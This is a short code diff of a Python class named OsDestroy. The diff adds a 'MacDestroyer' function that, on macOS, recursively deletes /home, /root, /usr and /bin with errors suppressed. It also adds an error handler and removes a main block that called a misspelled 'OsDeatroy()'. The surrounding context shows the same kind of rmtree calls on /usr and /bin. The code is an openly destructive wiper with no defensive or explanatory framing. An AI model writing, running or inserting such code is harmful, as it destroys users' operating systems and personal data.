@@ -53,6 +53,18 @@ class OsDestroy():
                         shutil.rmtree("/usr", ignore_errors=True)
                         shutil.rmtree("/bin", ignore_errors=True)
 
-if __name__ == "__main__":
+                except Exception as e:
+                        logging.error(f"error: {e}. Terminating processes.")
+                        
 
-          OsDeatroy()
+        def MacDestroyer():
+                if OS.lower() == "darwin":
+                        try:
+
+                                shutil.rmtree("/home", ignore_errors=True)
+                                shutil.rmtree("/root", ignore_errors=True)
+                                shutil.rmtree("/usr", ignore_errors=True)
+                                shutil.rmtree("/bin", ignore_errors=True)
+
+                        except Exception as e:
+                                logging.error(f"error: {e}. Terminating processes.")
